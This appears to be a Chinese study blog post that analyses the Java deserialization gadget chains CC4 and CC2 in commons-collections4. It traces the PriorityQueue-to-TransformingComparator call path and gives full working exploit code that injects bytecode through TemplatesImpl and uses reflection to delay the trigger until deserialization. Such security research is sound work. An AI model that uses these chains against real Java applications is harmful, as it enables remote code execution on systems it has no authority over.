# Java反序列化-CC4链 & CC2链

## 0x01 写在前面

之前跟着Drun1baby师傅的博客和白日梦组长的教程已经挖了CC1，CC6，CC3，后面的调用链都是大同小异(像这里我就把CC4和CC2写成一篇了)，所以想尝试着自己跟着ysoserial自己挖一下后面的链子

## 0x02 环境搭建

与前面的链子主要的区别是使用了`commons-collections4`的依赖，其他不变

```XML
<dependency>  
 <groupId>org.apache.commons</groupId>  
 <artifactId>commons-collections4</artifactId>  
 <version>4.0</version>  
</dependency>
```

## 0x03 链子挖掘

### 官方Gadget chain

```Java
Gadget chain:
        ObjectInputStream.readObject()
            PriorityQueue.readObject()
                ...
                    TransformingComparator.compare()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()
```

### 关于TransformingComparator

`InvokerTransformer.transform()`老朋友了，对`transform()`find Usages，在`TransformingComparator.compare()`实现了调用

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NjA4YWM2ZWNkZjU3MWU2YTZkMzFkMDk1YmI0MTgxODRfMlFXY1JyTG05RFJjNm1rVWZJWkhkM2IxNm0xZUFzYmNfVG9rZW46SGp1MGJsZlJQb1dpZ3V4N09TMmNkQllDbmZlXzE3NzM4MzU5OTM6MTc3MzgzOTU5M19WNA)

写个简单的Demo测试一下

```Java
Runtime r = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
transformingComparator.compare(r,new Object());
```

### 关于PriorityQueue

官方的链子中使用了`PriorityQueue.readObject()`完成了`compare()`方法的调用，跟进其看看如何实现

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NGIwNDgwMTRkZjA5N2JkYmQ3MDczMmYyN2RlY2RlYWJfMVJUZlI5c0Vqc25yYUc0R1Y0VE9FZzdaNnR1Q2RBTEVfVG9rZW46SUVYSGJCZDBBb01oTDZ4R0RCRWNkU3FtbkxkXzE3NzM4MzU5OTM6MTc3MzgzOTU5M19WNA)

`readObject()`最后调用了`heapify()`，我们跟进

```Java
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```

`heapify()`调用`siftDown()`,继续跟进

```Java
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}
```

`siftDown()`中调用了两个方法，最终在`siftDownUsingComparator()`实现了对`compare()`的调用

```Java
private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```

### Debug

根据以上内容就能写出我们的链子

```Java
TemplatesImpl templates = new TemplatesImpl();

Class tc = TemplatesImpl.class;
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "aaa");

Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("D://Task/test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);

InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(TrAXFilter.class),
        instantiateTransformer
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

serialize(priorityQueue);
unserialize("ser.bin");
```

尝试运行但是没有弹出计算器，毕竟反序列化时调用的是`PriorityQueue.readObject()`，在里面打断点进行调试

我们发现在`heapify()`内部，size的值为0，没有进入for代码块，也就没有触发`siftDown()`了

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MjgyNWZjOTY3MGYwZjc5NGIzZWZjOWNlYzk2NGQ2MWFfaWNVdm1GOHBPRlVZR2pJbHd2cGRtMmswdTByQXZhVERfVG9rZW46VTJUSmJFZEt2bzFUaEx4YXFicWNIanlTbnRiXzE3NzM4MzU5OTM6MTc3MzgzOTU5M19WNA)

调用 `priorityQueue.add(element)`，都会将元素插入堆中，并使 `size` 增加 1

尝试在序列化之前通过`priorityQueue.add()`修改`size`值

```Java
priorityQueue.add(1);
priorityQueue.add(1);
```

但是发生了报错，我们首先跟进`add()->offer()->siftUp()->siftUpUsingComparator()`

```C++
private void siftUpUsingComparator(int k, E x) {
    while (k > 0) {
        int parent = (k - 1) >>> 1;
        Object e = queue[parent];
        if (comparator.compare(x, (E) e) >= 0)
            break;
        queue[k] = e;
        k = parent;
    }
    queue[k] = x;
}
```

在`siftUpUsingComparator()`内部同样调用了`.compare()`，然后会调用 `transform()`，还没有进行序列化和反序列化时就进行了类实例化弹出计算器的代码但是由于 `_tfactory` 为 null导致报错，原因CC3讲过了

当我们添加`_tfactory`的值后

```Java
TemplatesImpl templates = new TemplatesImpl();

        Class tc = TemplatesImpl.class;
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaa");

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D://Task/test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(1);
//        serialize(priorityQueue);
//        unserialize("ser.bin");
```

成功弹出计算器，但是我们的目的不是在本地执行命令，而是在反序列化的时候执行

这里用到的方法在CC6里面讲过，先修改例子中的属性为无关的值，然后在序列化之前通过反射修改，这里我们就利用了`TransformingComparator`中的`transformer`使其无法在本地执行`transform()`（反序列化之前）

### CC4链exp

```Java
TemplatesImpl templates = new TemplatesImpl();

Class tc = TemplatesImpl.class;
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates, "aaa");

Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("D://Task/test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);

InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(TrAXFilter.class),
        instantiateTransformer
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

priorityQueue.add(1);
priorityQueue.add(1);

Class c = transformingComparator.getClass();
Field transformerField = c.getDeclaredField("transformer");
transformerField.setAccessible(true);
transformerField.set(transformingComparator, chainedTransformer);

serialize(priorityQueue);
unserialize("ser.bin");
```

### CC2链exp

CC2与CC4最主要的区别就是不再使用 `Transformer` 数组，抛弃了用 `InstantiateTransformer` 类将 `TrAXFilter` 初始化，以及 `TemplatesImpl.newTransformer()` 这个步骤而是通过`InvokerTransformer` 实现，难点在于用 `InvokerTransformer` 的连接

```Java
TemplatesImpl templates = new TemplatesImpl();

    Class tc = TemplatesImpl.class;
    Field nameField = tc.getDeclaredField("_name");
    nameField.setAccessible(true);
    nameField.set(templates, "aaa");

    Field bytecodesField = tc.getDeclaredField("_bytecodes");
    bytecodesField.setAccessible(true);
    byte[] code = Files.readAllBytes(Paths.get("D://Task/test.class"));
    byte[][] codes = {code};
    bytecodesField.set(templates,codes);

    InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",null,null);

    TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
    PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

    priorityQueue.add(templates);
    priorityQueue.add(1);

    Class c = transformingComparator.getClass();
    Field transformerField = c.getDeclaredField("transformer");
    transformerField.setAccessible(true);
    transformerField.set(transformingComparator, invokerTransformer);

    serialize(priorityQueue);
    unserialize("ser.bin");
}
```

**解释一下为什么****`templates`****要在第一个****`add()`****作为参数**

执行完两个`add()`后`templlates`和1已经被放入`priorityQueue`中，最后调用 `PriorityQueue.compare()` 的时候是传入队列中的两个对象，然后 `compare()` 中调用 `Transformer.transform(obj1)` 的时候用的是传入的第一个对象作为参数，因此这里需要将`priorityQueue`队列中的第一个对象设置为构造好的 `templates` 对象

当然，想偷懒的话也可以直接：

```Java
priorityQueue.add(templates);
priorityQueue.add(templates);
```

## 0x04 写在后面

关于CC4中size的属性，其实可以不用add()，直接进行反射调用修改就好了

```Java
Class c = PriorityQueue.class;
Field sizeField = c.getDeclaredField("size");
sizeField.setAccessible(true);
sizeField.set(priorityQueue, 2);
```

(这个做法我认为更方便一些

最后是流程图

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MDUzNzgwY2RmMTY0Y2ZmMWFiOWJmYzg1MmU1ZTMzMzZfb0h0bVJUMHZDYWFCd1JhZ2FxVHliS0t2aXpEVThSVkhfVG9rZW46WWFMNGJ4cGk1bzFqb0l4QW9tNmNZZ3dJbmhnXzE3NzM4MzU5OTM6MTc3MzgzOTU5M19WNA)

参考:

https://drun1baby.github.io/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/

https://drun1baby.github.io/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/

https://bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.1387.homepage.video_card.click